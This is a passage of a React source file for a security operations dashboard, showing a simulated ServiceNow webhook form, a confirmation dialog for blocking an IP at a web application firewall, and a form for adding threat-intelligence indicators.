            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
              Simulates ServiceNow sending an inbound webhook updating an existing incident status and writing analyst investigation notes.
            </p>

            <div style={{ marginBottom: '0.65rem' }}>
              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>ServiceNow Incident #</label>
              <input
                type="text"
                placeholder="SIR0010001"
                value={webhookSimNumber}
                onChange={(e) => setWebhookSimNumber(e.target.value)}
                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
              />
            </div>

            <div style={{ marginBottom: '0.65rem' }}>
              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Updated State Code</label>
              <select
                value={webhookSimState}
                onChange={(e) => setWebhookSimState(e.target.value)}
                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
              >
                <option value="2">2 - Investigating (Work Notes)</option>
                <option value="3">3 - Contained (IP Restricted)</option>
                <option value="6">6 - Resolved (Grant Revoked)</option>
                <option value="7">7 - Closed</option>
              </select>
            </div>

            <div style={{ marginBottom: '0.85rem' }}>
              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Analyst Work Notes</label>
              <textarea
                rows={3}
                value={webhookSimNotes}
                onChange={(e) => setWebhookSimNotes(e.target.value)}
                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
              />
            </div>

            <button
              onClick={handleSendInboundWebhook}
              disabled={sendingInbound || !webhookSimNumber.trim()}
              className="btn btn-secondary"
              style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem', fontWeight: 700 }}
              id="send-inbound-webhook-btn"
            >
              <Send size={15} />
              <span>{sendingInbound ? 'Dispatching Webhook...' : 'Simulate Inbound ServiceNow Webhook'}</span>
            </button>
          </div>
        </div>
      )}

      {/* Modal: Block IP */}
      {blockIpModal.open && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
        >
          <div
            className="glass-panel"
            style={{
              background: '#ffffff',
              padding: '1.5rem',
              borderRadius: 'var(--radius-lg)',
              maxWidth: '420px',
              width: '90%',
              boxShadow: '0 8px 30px rgba(0,0,0,0.2)',
            }}
          >
            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: '#b91c1c', marginBottom: '0.5rem' }}>
              Confirm WAF IP Block
            </h3>
            <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
              Are you sure you want to restrict incoming requests from IP <strong>{blockIpModal.ip}</strong>?
            </p>

            <div style={{ marginBottom: '0.75rem' }}>
              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Block Reason</label>
              <input
                type="text"
                value={blockReason}
                onChange={(e) => setBlockReason(e.target.value)}
                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
              />
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1.25rem', fontSize: '0.8rem' }}>
              <input
                type="checkbox"
                id="isPermCheck"
                checked={blockIpModal.isPerm}
                onChange={(e) => setBlockIpModal({ ...blockIpModal, isPerm: e.target.checked })}
              />
              <label htmlFor="isPermCheck" style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
                Permanent Block (otherwise 60 min temporary block)
              </label>
            </div>

            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem' }}>
              <button
                onClick={() => setBlockIpModal({ open: false, ip: '', isPerm: false })}
                className="btn btn-secondary"
              >
                Cancel
              </button>
              <button
                onClick={handleBlockIp}
                className="btn btn-primary"
                style={{ background: '#b91c1c', borderColor: '#991b1b' }}
              >
                Confirm Block
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal: New IOC Indicator */}
      {newIocModal && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
        >
          <div
            className="glass-panel"
            style={{
              background: '#ffffff',
              padding: '1.5rem',
              borderRadius: 'var(--radius-lg)',
              maxWidth: '460px',
              width: '90%',
              boxShadow: '0 8px 30px rgba(0,0,0,0.2)',
            }}
          >
            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.75rem' }}>
              Add Threat Intelligence Indicator (IOC)
            </h3>

            <form onSubmit={handleCreateIoc}>
              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', gap: '0.5rem', marginBottom: '0.65rem' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Type</label>
                  <select
                    value={newIocType}
                    onChange={(e) => setNewIocType(e.target.value)}
                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  >
                    <option value="IP">IP Address</option>
                    <option value="HASH">File Hash</option>
                    <option value="DOMAIN">Domain</option>
                    <option value="URL">Malicious URL</option>
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Indicator Value</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. 198.51.100.99"
                    value={newIocValue}
                    onChange={(e) => setNewIocValue(e.target.value)}
                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                  />
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginBottom: '0.65rem' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Threat Actor</label>
                  <input
                    type="text"
                    placeholder="e.g. APT29"
                    value={newIocActor}
                    onChange={(e) => setNewIocActor(e.target.value)}
                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  />
                </div>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Campaign</label>
                  <input
                    type="text"
                    placeholder="e.g. Operation Ghost"
                    value={newIocCampaign}
                    onChange={(e) => setNewIocCampaign(e.target.value)}
                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  />
                </div>
              </div>

              <div style={{ marginBottom: '0.65rem' }}>
                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Confidence Score: {newIocConfidence}%</label>
                <input
                  type="range"
                  min="50"
                  max="100"
                  value={newIocConfidence}
                  onChange={(e) => setNewIocConfidence(Number(e.target.value))}
                  style={{ width: '100%' }}
                />
              </div>

              <div style={{ marginBottom: '1rem' }}>
                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Description / Context</label>
                <textarea
                  rows={2}
                  required
                  placeholder="Known command and control or payload injection source..."
                  value={newIocDesc}
                  onChange={(e) => setNewIocDesc(e.target.value)}
                  style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem' }}>
                <button
                  type="button"
                  onClick={() => setNewIocModal(false)}
                  className="btn btn-secondary"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn btn-primary"
                >
                  Save Indicator
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
